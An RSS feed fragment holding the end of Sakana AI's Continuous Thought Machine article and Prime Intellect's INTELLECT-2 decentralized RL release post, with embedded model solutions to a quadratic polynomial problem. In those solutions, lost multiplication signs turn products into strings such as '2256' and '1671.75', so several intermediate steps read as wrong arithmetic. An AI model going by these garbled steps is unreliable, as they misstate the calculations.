<p>Fig 18. shows what happens when we vary the number of neurons (i.e., the model width) while keeping all else constant, including the training time. As with other models, a wider network could evidently benefit from a longer training time or different training hyper-parameters, hence the reduction in accuracy in Fig 18a. For Fig 18b. and Fig 18c. we set out to understand how unique the <a href="#neuron-level-models">Neuron-level models</a> tend to be, and that was related to the model width, as measured by the cosine similarity between the dynamics of different neurons. Fig 18b. shows that with a wider model (i.e., more neurons), we see more diversity instead of less. One might expect that with more neurons there is less 'space' for diversity, but we observed the opposite.</p>

<p>Fig 19. shows the relationship between predictions and the number of internal ticks used by the CTM. We trained several CTMs (again keeping all other variables constant). In Fig 19b. we plot the distributions of the data over which steps the CTM is most certain (i.e., <span><span><math><semantics><mrow><msub><mi>t</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">t_2</annotation></semantics></math></span></span> in <a href="#loss-function">the loss function</a>). What this shows is that the CTM uses a wide range of steps to become most certain about the data it observes. For each setup (25, 50 and 100 internal ticks), there are two concentrated areas in the distributions, indicating that the CTM is following separate internal processes depending on the data.</p>

<h3>Sorting real numbers</h3>
<p>For these experiments we trained a CTM to sort 30 real numbers from <span><span><math><semantics><mrow><mrow><mi mathvariant="script">N</mi></mrow><mo>(</mo><mn>0</mn><mo separator="true">,</mo><msub><mrow><mi>I</mi></mrow><mrow><mn>3</mn><mn>0</mn></mrow></msub><mo>)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(0, {I}_{30})</annotation></semantics></math></span></span>. The purpose of this experiment was twofold: (1) to understand if and when the CTM applies more or less compute in a controlled environment; and (2) see if we can train the CTM to output a sequence in sequential order using the <a href="https://pytorch.org/docs/stable/generated/torch.nn.CTCLoss.html">CTC loss</a>. This CTM could sort a length 30 list of real numbers approximately 80% of the time.</p>

<h3>Reinforcement Learning</h3>
<p>We have shown that the CTM can process non-sequential data via an continuous thought dimension. Here, we extend the CTM to tasks involving interation with an external environment, training CTMs with proximal policy optimization<dt-cite key="schulman2017proximal"></dt-cite> to solve a navigation task and partially observable variants of CartPole and Acrobot<dt-cite key="MinigridMiniworld23,towers2024gymnasium"></dt-cite>. In this setting, the CTM receives an observation, process it using a fixed number of internal thought steps, and outputs the next action. The history of activations is continuous across environment steps, such that activations from past environment steps can affect the present decision making process.</p>
<div>
  <figure>
    <video src="https://pub.sakana.ai/ctm/assets/mp4/rl/activations.mp4" type="video/mp4" autoplay="" muted="" playsinline="" loop=""></video>
    <figcaption>
    <span><b>Fig 21a.</b> CTM solving the MiniGrid Four Rooms task</span>: evidencing that the CTM can use a leverage a continuous history of activations to interact with the world.
    </figcaption>
  </figure>
  <figure>
    <img src="https://pub.sakana.ai/ctm/assets/png/rl/episode_lengths_avg.png" alt="CTM Training Curves of MiniGrid Four Rooms">
    <figcaption>
    <span><b>Fig 21b.</b>Training curves</span>: for this navigation task (episode length during training). Although the LSTM learns slightly faster, both solve the task and converge to the same average episode length.
    </figcaption>
  </figure>
</div>
<p>Although our results show that the CTM achieves a comparable performance to the LSTM baseline, the central goal of this section is provide evidence that the CTM can learn in a continuous environment.</p>
<hr>
<h2>Conclusion</h2>
<p>The Continuous Thought Machine (CTM) represents a novel step towards bridging computational efficiency with biological plausibility in artificial intelligence. By moving beyond traditional pointwise activation functions to private neuron-level models, the CTM cultivates far richer neuron dynamics. Crucially, it leverages neural synchronization as a powerful and fundamentally new type of representation - distinct from the activation vectors prevalent since the early days of neural networks. This direct use of neuron dynamics as a first-class representational citizen allows the CTM to exhibit behaviors qualitatively different from contemporary models.</p>
<p>Our research demonstrates the tangible benefits of this approach. The CTM can dynamically build representations over time for tasks like image classification, form rich internal maps to attend to specific input data without positional embeddings, and naturally exhibit adaptive computation. Furthermore, it learns to synchronize neural dynamics to store and retrieve memories beyond its immediate activation history. This internal processing also lends itself to greater interpretability, as seen in its methodical solving of mazes and parity tasks.</p>
<p>Remarkably, the core CTM architecture remained largely consistent across a diverse range of challenging tasks, requiring only input/output module adjustments. This versatility and trainability were particularly evident in complex scenarios like maze navigation. The CTM succeeded with minimal tuning, where a traditional model like the LSTMs still struggled even after significant tuning efforts.</p>
<p>This work underscores a vital, yet often underexplored, synergy between neuroscience and machine learning. While modern AI is ostensibly brain-inspired, the two fields often operate in surprising isolation. The CTM serves as a testament to the power of drawing inspiration from biological principles. By starting with such inspiration and iteratively following the emergent, interesting behaviors, we developed a model with unexpected capabilities, such as its surprisingly strong calibration in classification tasks, a feature that was not explicitly designed for.</p>
<p>It is crucial to note that our approach advocates for borrowing concepts from biology rather than insisting on strict, literal plausibility; real neurons may not access their activation history as modeled in the CTM, yet emergent phenomena like traveling waves still manifest. This nuanced balance between practicality and biological inspiration opens a landscape of new research directions, which may hold the key to unlocking capabilities currently missing in AI, potentially leading to systems that exhibit more human-like intelligence and address its current limitations.</p>
<p>When we initially asked, "why do this research?", we hoped the journey of the CTM would provide compelling answers. By embracing light biological inspiration and pursuing the novel behaviors observed, we have arrived at a model with emergent capabilities that exceeded our initial designs. We are committed to continuing this exploration, borrowing further concepts to discover what new and exciting behaviors will emerge, pushing the boundaries of what AI can achieve.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intellect-2 Release: The First 32B Model Trained Through Globally Distributed RL (194 pts)]]></title>
            <link>https://www.primeintellect.ai/blog/intellect-2-release</link>
            <guid>43958898</guid>
            <pubDate>Mon, 12 May 2025 01:46:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.primeintellect.ai/blog/intellect-2-release">https://www.primeintellect.ai/blog/intellect-2-release</a>, See on <a href="https://news.ycombinator.com/item?id=43958898">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="sectionFixed"><div><div><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report.png" loading="lazy" alt="" sizes="100vw" srcset="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report-p-500.png 500w, https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report-p-800.png 800w, https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report-p-1080.png 1080w, https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report-p-1600.png 1600w, https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report-p-2000.png 2000w, https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682104ffd9b893407813e24e_intellect-2-technical-report.png 2160w"></p></div><div data-w-id="e5e1e688-1022-43bb-86ee-2597b4f74f82"><div id="blogRichText" fs-toc-element="contents" fs-toc-offsettop="8rem" fs-richtext-element="rich-text"><p>We're excited to release INTELLECT-2, the first 32B parameter model trained via globally distributed reinforcement learning. &nbsp;Unlike traditional centralized training efforts, INTELLECT-2 trains a reasoning language model using fully asynchronous RL across a dynamic, heterogeneous swarm of permissionless compute contributors.</p><p>To enable a training run with this unique infrastructure, we built various components from scratch: we introduce PRIME-RL, our training framework purpose-built for distributed asynchronous reinforcement learning, based on top of novel components such as TOPLOC, which verifies rollouts from untrusted inference workers, and SHARDCAST, which efficiently broadcasts policy weights from training nodes to inference workers.</p><p>Beyond infrastructure components, we propose modifications to the standard GRPO training recipe and data filtering techniques that were crucial to achieve training stability and ensure that our model successfully learned its training objective, thus improving upon QwQ-32B.</p><p>We open-source INTELLECT-2 along with our code and data, hoping to enable more open research in the field of decentralized training</p><ul role="list"><li><strong>Detailed Technical Report: </strong><a href="http://primeintellect.ai/intellect-2">primeintellect.ai/intellect-2</a></li><li><a href="https://huggingface.co/collections/PrimeIntellect/intellect-2-68205b03343a82eabc802dc2"><strong>INTELLECT-2 on Hugging Face</strong></a><ul role="list"><li>Chat Interface to try it out: <a href="http://chat.primeintellect.ai/">chat.primeintellect.ai</a></li></ul></li><li><a href="https://github.com/PrimeIntellect-ai/prime-rl"><strong>prime-rl: – our async RL framework</strong></a></li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/68210770ed19e45df800ade8_Screenshot%202025-03-25%20at%2017.46.32%20(2).png" loading="lazy" alt=""></p></figure><h2><strong>Paradigm Shift for Decentralized Training</strong></h2><p>Test-time compute scaling with reinforcement learning has emerged as a new scaling axis for large language models (LLMs), enabling improvements by allowing models to spend more time reasoning.</p><p>However, reinforcement learning training is typically centralized, requiring large clusters of co-located GPUs and fast interconnect speeds. With INTELLECT-2, we showcase a paradigm shift: reinforcement learning is inherently more asynchronous and well suited for decentralized, globally distributed compute.</p><h2>Training Infrastructure</h2><p>We introduce the following key open-source infrastructure components for training INTELLECT-2:</p><ul role="list"><li><a href="https://github.com/PrimeIntellect-ai/prime-rl"><strong>PRIME-RL</strong>:</a><ul role="list"><li>Fully asynchronous reinforcement learning framework designed for decentralized training. Decouples rollout generation, model training, and weight broadcasting. It enables training across heterogeneous, unreliable networks.</li><li>The trainer implementation uses PyTorch FSDP2, inference uses vLLM and the verifiers use the <a href="https://github.com/PrimeIntellect-ai/genesys">GENESYS</a> schema introduced in <a href="https://www.primeintellect.ai/blog/synthetic-1-release">SYNTHETIC-1</a>.</li></ul></li><li><strong>SHARDCAST</strong>: A library for distributing large files via a HTTP-based tree-topology network that efficiently propagates updated model weights to the decentralized inference workers.</li></ul><p>‍</p><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/67fc98b6b2ae65e17cf41926_Blog%20Asset.png" loading="lazy" alt=""></p></figure><ul role="list"><li><strong>TOPLOC</strong>:<ul role="list"><li>A locality-sensitive hashing scheme for efficient verifiable inference. It detects tampering or precision changes in model inference and works reliably across nondeterministic GPU hardware.</li><li>Inference workers generate the rollouts, these rollout files are uploaded via signed URLs, an on-chain event triggers TOPLOC validators to check them; accepted files feed the trainer, while invalid ones slash and remove the submitting node from the pool.</li></ul></li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682107b3b1d00e49e0e1d232_toploc-validator.png" loading="lazy" alt=""></p></figure><ul role="list"><li><a href="https://github.com/PrimeIntellect-ai/pi-protocol"><strong>Protocol Testnet</strong>:</a> Provides the infrastructure to aggregate and coordinate global computeresources.<ul role="list"><li>Rust-based orchestrator and discovery service coordinate permissionless workers—nodes auto-register with hardware checks, heartbeats, and <em>pull</em> Docker-container tasks while the orchestrator schedules workloads, tracks health, and records pool ownership and contributions.</li></ul></li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682107d311028667c6db24ad_image%20(1).png" loading="lazy" alt=""></p></figure><h2>Training Recipe</h2><ul role="list"><li><strong>Training Data &amp; Rewards:</strong><ul role="list"><li>285k verifiable tasks (math &amp; coding) from <strong>NuminaMath-1.5, Deepscaler</strong>, and <a href="https://www.primeintellect.ai/blog/synthetic-1-release">SYNTHETIC-1</a>.</li><li>Binary task reward + length reward lets users budget thinking tokens at inference time.</li></ul></li><li><strong>Two-step asynchronous RL:</strong> The broadcast of new policy weights is fully overlapped with ongoing inference and training—eliminating the communication bottleneck</li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682107ef11028667c6db337a_async-rl-schedule.png" loading="lazy" alt=""></p></figure><ul role="list"><li><strong>Two-Sided GRPO Clipping:</strong> Stabilizes training by mitigating gradient spikes with two-sided token probability ratio clipping.</li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/6821080742d40ea0c31cfc42_two-sided-clipping.png" loading="lazy" alt=""></p></figure><ul role="list"><li><strong>Advanced Data Filtering:</strong> Combines offline and online filtering to select challenging tasks, significantly enhancing model learning efficiency.</li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/6821086978179d3909d2a696_data-filtering.png" loading="lazy" alt=""></p></figure><ul role="list"><li><strong>Aggressive Gradient Clipping:</strong> Addresses escalating gradient norms at scale, providing improved training stability.</li></ul><h2>Experiments</h2><p>We report results from two main experiments: TARGET-SHORT, an experimental run with short target lengths to train an efficient reasoning model, and, TARGET-LONG, our main run with longer target lengths.</p><ul role="list"><li><strong>Compute Utilization:</strong> During the two main experiments, we successfully overlapped communication with computation through two-step asynchronous reinforcement learning.</li><li><strong>Reward Trajectories:</strong><ul role="list"><li>Throughout training, we saw significant improvements of our task rewards, indicating that the model improved its performance on our mathematics and coding problems. We also saw a reduction of length penalties, but a much slower one than during our ablation experiments</li></ul></li></ul><p>‍</p><ul role="list"><li><strong>Benchmark Performance:</strong> We were able to increase the performance of QwQ-32B on mathematics and coding benchmarks.</li></ul><figure><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c7e/682108892e5b8c350cb40532_benchmarks.png" loading="lazy" alt=""></p></figure><ul role="list"><li>Overall, as QwQ-32B was already extensively trained with RL, it was difficult to obtain huge amounts of generalized improvement on benchmarks beyond our improvements on the training dataset. To see stronger improvements, it is likely that better base models such as the now available Qwen3, or higher quality datasets and RL environments are needed.</li></ul><h2>Future Work</h2><p>INTELLECT-2 is a first step towards open frontier reasoning models trained in a decentralized fashion. Over the coming months, we’ll work on:</p><ul role="list"><li><strong>Increasing the Ratio of Inference to Training Compute</strong><ul role="list"><li>Inference is embarrassingly parallel and communication-free, so more complex RL environments that devote <em>more</em> FLOPs to inference are a natural fit for decentralized training.</li></ul></li><li><strong>Tool Calls &amp; Multi-Turn RL</strong><ul role="list"><li>To fully leverage inference-time compute for scientific and research progress, we need to give models built-in tools in its reasoning chain—web search, Python interpreters, etc.</li></ul></li><li><strong>Crowdsourcing RL Tasks &amp; Environments</strong><ul role="list"><li>We believe open-source has a unique advantage here. Distributed RL is still in its early days, and with the right community and contributions, open-source AI can outpace the closed labs.</li></ul></li><li><strong>Model Merging &amp; DiLoCo</strong><ul role="list"><li>Fuse independently trained RL models—either at the end or continuously via DiLoCo—to create a single unified model, scaling decentralized RL to a lot more compute.</li></ul></li></ul><p>Check out the technical reports for more details: <a href="https://www.primeintellect.ai/intellect-2">primeintellect.ai/intellect-2</a></p><h2><strong>Join Us</strong></h2><p>INTELLECT-2 demonstrates that globally decentralized RL works. Now, we’re focusing on tool-assisted reasoning, crowdsourcing higher-quality data, and optimizing our infrastructure and training recipe to build frontier open models.</p><p>Join us if you want to build open source and decentralized AGI with us.</p></div><div data="chatbox"><div><p>Eurus-2-PRIME</p><div><div><p>When tackling complex reasoning tasks, you have access to the following actions. Use them as needed to progress through your thought process. [ASSESS] [ADVANCE] [VERIFY] [SIMPLIFY] [SYNTHESIZE] [PIVOT] [OUTPUT] You should strictly follow the format below: [ACTION NAME] # Your action step 1 # Your action step 2 # Your action step 3 ... Next action: [NEXT ACTION NAME]</p></div><div><p>Quadratic polynomials $P(x)$ and $Q(x)$ have leading coefficients $2$ and $-2,$ respectively. The graphs of both polynomials pass through the two points $(16,54)$ and $(20,53).$ Find $P(0) + Q(0).$</p></div><div><p>

[ASSESS]</p><p>We are given two quadratic polynomials $P(x)$ and $Q(x)$ with leading coefficients $2$ and $-2$, respectively. The graphs of both polynomials pass through the points $(16,54)$ and $(20,53)$. We need to find the value of $P(0) + Q(0)$.</p><p>[ADVANCE]</p><p>Let's express the quadratic polynomials $P(x)$ and $Q(x)$ in the general form:<br>  
$ P(x) = 2x^2 + bx + c $<br>  
$ Q(x) = -2x^2 + dx + e $</p><p>Since the graphs of both polynomials pass through the points $(16,54)$ and $(20,53)$, we can substitute these points into the equations of $P(x)$ and $Q(x)$ to form a system of equations.</p><p>For $P(x)$:<br>  
$ P(16) = 2(16)^2 + 16b + c = 54 $<br>  
$ 512 + 16b + c = 54 $<br>  
$ 16b + c = -458 \quad \text{(Equation 1)} $</p><p>  
$ P(20) = 2(20)^2 + 20b + c = 53 $<br>  
$ 800 + 20b + c = 53 $<br>  
$ 20b + c = -747 \quad \text{(Equation 2)} $</p><p>For $Q(x)$:<br>  
$ Q(16) = -2(16)^2 + 16d + e = 54 $<br>  
$ -512 + 16d + e = 54 $<br>  
$ 16d + e = 566 \quad \text{(Equation 3)} $</p><p>  
$ Q(20) = -2(20)^2 + 20d + e = 53 $<br>  
$ -800 + 20d + e = 53 $<br>  
$ 20d + e = 853 \quad \text{(Equation 4)} $</p><p>[ADVANCE]</p><p>Now, we can solve the system of equations for $P(x)$:<br>Subtract Equation 1 from Equation 2:<br>  
$ (20b + c) - (16b + c) = -747 - (-458) $<br>  
$ 4b = -289 $<br>  
$ b = -\frac{289}{4} $</p><p>Substitute $b = -\frac{289}{4}$ into Equation 1:<br>  
$ 16\left(-\frac{289}{4}\right) + c = -458 $<br>  
$ -1156 + c = -458 $<br>  
$ c = 698 $</p><p>So, for $P(x)$, we have:<br>  
$ P(x) = 2x^2 - \frac{289}{4}x + 698 $<br>  
$ P(0) = 698 $</p><p>Next, we can solve the system of equations for $Q(x)$:<br>Subtract Equation 3 from Equation 4:<br>  
$ (20d + e) - (16d + e) = 853 - 566 $<br>  
$ 4d = 287 $<br>  
$ d = \frac{287}{4} $</p><p>Substitute $d = \frac{287}{4}$ into Equation 3:<br>  
$ 16\left(\frac{287}{4}\right) + e = 566 $<br>  
$ 1148 + e = 566 $<br>  
$ e = -582 $</p><p>So, for $Q(x)$, we have:<br>  
$ Q(x) = -2x^2 + \frac{287}{4}x - 582 $<br>  
$ Q(0) = -582 $</p><p>[ADVANCE]</p><p>Finally, we can find $P(0) + Q(0)$:<br>  
$ P(0) + Q(0) = 698 + (-582) = 116 $</p><p>So, the value of $P(0) + Q(0)$ is $\boxed{116}$.
</p></div></div></div><div><p>INTELLECT-MATH-7B-SFT (ours)</p><div><div><p>Solve the following math problem efficiently and clearly. Think carefully and step by step about your response and reason before providing a final response. Conclude your response with: \n\nTherefore, the final answer is: $\\boxed{answer}$. I hope it is correct.\n\nWhere [answer] is just the final number or expression that solves the problem.</p></div><div><p>Quadratic polynomials $P(x)$ and $Q(x)$ have leading coefficients $2$ and $-2,$ respectively. The graphs of both polynomials pass through the two points $(16,54)$ and $(20,53).$ Find $P(0) + Q(0).$</p></div><div><div><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c75/678edcd5f221a97f3337fc68_Ellipse%201.png" loading="lazy" alt=""></p><p>INTELLECT-MATH-7B-SFT</p></div><div><p>
So I've got this problem here about quadratic polynomials $P(x)$ and $Q(x)$. $P(x)$ has a leading coefficient of $2$, and $Q(x)$ has a leading coefficient of $-2$. Both polynomials pass through the points $(16,54)$ and $(20,53)$. I need to find $P(0) + Q(0)$.</p><p>
First, since both $P(x)$ and $Q(x)$ are quadratic polynomials, I can express them in the general form:</p><p>
$P(x) = 2x^2 + bx + c$</p><p>
$Q(x) = -2x^2 + dx + e$</p><p>
Wait, actually, the leading coefficient is the coefficient of the highest power of $x$, which for a quadratic is $x^2$. So yes, $P(x) = 2x^2 + bx + c$ and $Q(x) = -2x^2 + dx + e$.</p><p>
Now, both polynomials pass through the points $(16,54)$ and $(20,53)$. That means when $x=16$, $P(16)=54$, and when $x=20$, $P(20)=53$. Similarly for $Q(x)$.</p><p>
So, I can set up equations using these points.</p><p>
First, for $P(x)$:</p><p>
$P(16) = 2(16)^2 + b16 + c = 54$</p><p>
Similarly, $P(20) = 2(20)^2 + b20 + c = 53$</p><p>
Let me calculate $16^2$ and $20^2$:</p><p>
$16^2 = 256$</p><p>
$20^2 = 400$</p><p>
So,</p><p>
$P(16): 2256 + 16b + c = 54 \Rightarrow 512 + 16b + c = 54 \Rightarrow 16b + c = 54 - 512 \Rightarrow 16b + c = -458$</p><p>
$P(20): 2400 + 20b + c = 53 \Rightarrow 800 + 20b + c = 53 \Rightarrow 20b + c = 53 - 800 \Rightarrow 20b + c = -747$</p><p>
Now, I have two equations:</p><p>
1) $16b + c = -458$</p><p>
2) $20b + c = -747$</p><p>
I can subtract equation 1 from equation 2 to eliminate $c$:</p><p>
$(20b + c) - (16b + c) = -747 - (-458)$</p><p>
$20b + c - 16b - c = -747 + 458$</p><p>
$4b = -289$</p><p>
So, $b = -289 / 4 = -72.25$</p><p>
Wait, but coefficients are usually integers, but maybe not. Let me check.</p><p>
Now, plug $b$ back into one of the equations to find $c$. Let's use equation 1:</p><p>
$16(-72.25) + c = -458$</p><p>
$-1156 + c = -458$</p><p>
$c = -458 + 1156 = 698$</p><p>
So, $P(x) = 2x^2 - 72.25x + 698$</p><p>
Hmm, $P(0)$ would be $c$, which is $698$.</p><p>
Now, let's do the same for $Q(x)$.</p><p>
$Q(16) = -2*(16)^2 + d16 + e = 54 \Rightarrow -2256 + 16d + e = 54 \Rightarrow -512 + 16d + e = 54 \Rightarrow 16d + e = 54 + 512 \Rightarrow 16d + e = 566$</p><p>
$Q(20) = -2*(20)^2 + d20 + e = 53 \Rightarrow -2400 + 20d + e = 53 \Rightarrow -800 + 20d + e = 53 \Rightarrow 20d + e = 53 + 800 \Rightarrow 20d + e = 853$</p><p>
Now, equations for $Q(x)$:</p><p>
1) $16d + e = 566$</p><p>
2) $20d + e = 853$</p><p>
Subtract equation 1 from equation 2:</p><p>
$(20d + e) - (16d + e) = 853 - 566$</p><p>
$4d = 287$</p><p>
$d = 287 / 4 = 71.75$</p><p>
Now, plug $d$ back into equation 1:</p><p>
$1671.75 + e = 566 \Rightarrow 1148 + e = 566 \Rightarrow e = 566 - 1148 = -582$</p><p>
So, $Q(x) = -2x^2 + 71.75x - 582$</p><p>
Therefore, $Q(0) = e = -582$</p><p>
Now, $P(0) + Q(0) = 698 + (-582) = 116$</p><p>
Wait, but the problem says "present the answer in LaTeX format: \boxed{Your answer}"</p><p>
So, I should write $\boxed{116}$</p><p>
But let me double-check my calculations to make sure I didn't make any mistakes.</p><p>
First, for $P(x)$:</p><p>
$P(16) = 2(256) + 16b + c = 512 + 16b + c = 54 \Rightarrow 16b + c = -458$</p><p>
$P(20) = 2*(400) + 20b + c = 800 + 20b + c = 53 \Rightarrow 20b + c = -747$</p><p>
Subtracting: $4b = -289 \Rightarrow b = -72.25$</p><p>
Then, $c = -458 - 16*(-72.25) = -458 + 1156 = 698$</p><p>
Similarly for $Q(x)$:</p><p>
$Q(16) = -2*(256) + 16d + e = -512 + 16d + e = 54 \Rightarrow 16d + e = 566$</p><p>
$Q(20) = -2*(400) + 20d + e = -800 + 20d + e = 53 \Rightarrow 20d + e = 853$</p><p>
Subtracting: $4d = 287 \Rightarrow d = 71.75$</p><p>
Then, $e = 566 - 16*71.75 = 566 - 1148 = -582$</p><p>
So, $P(0) = 698$, $Q(0) = -582$, sum is $116$.</p><p>
Seems correct.</p><p>
Final Answer</p><p>
$\boxed{116}$
</p></div></div></div></div><div><p>INTELLECT-MATH-7B (ours)</p><div><div><p>Solve the following math problem efficiently and clearly. Think carefully and step by step about your response and reason before providing a final response. Conclude your response with: \n\nTherefore, the final answer is: $\\boxed{answer}$. I hope it is correct.\n\nWhere [answer] is just the final number or expression that solves the problem.</p></div><div><p>Quadratic polynomials $P(x)$ and $Q(x)$ have leading coefficients $2$ and $-2,$ respectively. The graphs of both polynomials pass through the two points $(16,54)$ and $(20,53).$ Find $P(0) + Q(0).$</p></div><div><div><p><img src="https://cdn.prod.website-files.com/66239f0441b09824acb92c75/678edcd5f221a97f3337fc68_Ellipse%201.png" loading="lazy" alt=""></p><p>INTELLECT-MATH-7B</p></div><div><p>
So I have two quadratic polynomials, $P(x)$ and $Q(x)$, with leading coefficients 2 and -2, respectively. Both pass through the points $(16,54)$ and $(20,53)$. I need to find $P(0) + Q(0)$.</p><p>First, since both are quadratic polynomials, I can express them in the general form:</p><p>$P(x) = 2x² + bx + c$</p><p>$Q(x) = -2x² + dx + e$</p><p>But since both pass through the points $(16,54)$ and $(20,53)$, I can set up equations using these points.</p><p>For $P(x)$:</p><p>$P(16) = 2*(16)² + b \cdot 16 + c = 54$</p><p>$P(20) = 2(20)² + b \cdot 20 + c = 53$</p><p>Similarly for $Q(x)$:</p><p>$Q(16) = -2(16)² + d \cdot 16 + e = 54$</p><p>$Q(20) = -2(20)² + d \cdot 20 + e = 53$</p><p>Let's compute the squares:</p><p>$16² = 256$</p><p>$20² = 400$</p><p>So for $P(x)$:</p><p>$2256 + 16b + c = 54 \Rightarrow 512 + 16b + c = 54 \Rightarrow 16b + c = 54 - 512 = -458 \quad ...(1)$</p><p>$2400 + 20b + c = 53 \Rightarrow 800 + 20b + c = 53 \Rightarrow 20b + c = 53 - 800 = -747 \quad ...(2)$</p><p>For $Q(x)$:</p><p>$-2256 + 16d + e = 54 \Rightarrow -512 + 16d + e = 54 \Rightarrow 16d + e = 54 + 512 = 566 \quad ...(3)$</p><p>$-2400 + 20d + e = 53 \Rightarrow -800 + 20d + e = 53 \Rightarrow 20d + e = 53 + 800 = 853 \quad ...(4)$</p><p>Now, I have two systems of linear equations:</p><p>For $P(x)$:</p><p>$16b + c = -458 \quad ...(1)$</p><p>$20b + c = -747 \quad ...(2)$</p><p>Subtract equation (1) from equation (2):</p><p>$(20b + c) - (16b + c) = -747 - (-458)$</p><p>$4b = -289 \Rightarrow b = -\frac{289}{4}$</p><p>Now plug $b$ back into equation (1):</p><p>$16\left(-\frac{289}{4}\right) + c = -458 \Rightarrow -1156 + c = -458 \Rightarrow c = -458 + 1156 = 698$</p><p>So $P(x) = 2x² - \frac{289}{4}x + 698$</p><p>For $Q(x)$:</p><p>$16d + e = 566 \quad ...(3)$</p><p>$20d + e = 853 \quad ...(4)$</p><p>Subtract equation (3) from equation (4):</p><p>$(20d + e) - (16d + e) = 853 - 566$</p><p>$4d = 287 \Rightarrow d = \frac{287}{4}$</p><p>Now plug $d$ back into equation (3):</p><p>$16\left(\frac{287}{4}\right) + e = 566 \Rightarrow 1148 + e = 566 \Rightarrow e = 566 -1148= -582$</p><p>So $Q(x)=-2x^{2}+\frac{287}{4}x-582$. </p><p>Now, $P(0)=c=698$. </p><p>$Q(0)=e=-582$. </p><p>Therefore, $P(0)+Q(0)=698+(-582)=116$. </p><p>Final Answer</p><p>$\boxed{116}$.

</p></div></div></div></div></div></div><div><p>Acknowledgements</p><p>Prime Intellect Research Team: Sami Jaghouar, Justus Mattern, Jack Min Ong, Jannik Straube, Manveer Basra, Aaron Pazdera, Matthew Di Ferrante, Kushal Thaman, Felix Gabriel, Fares Obeid, Kemal Erdem, Michael Keiblinger, Johannes Hagemann</p></div></div></section></div>]]></description>
        </item>
    </channel>
</rss>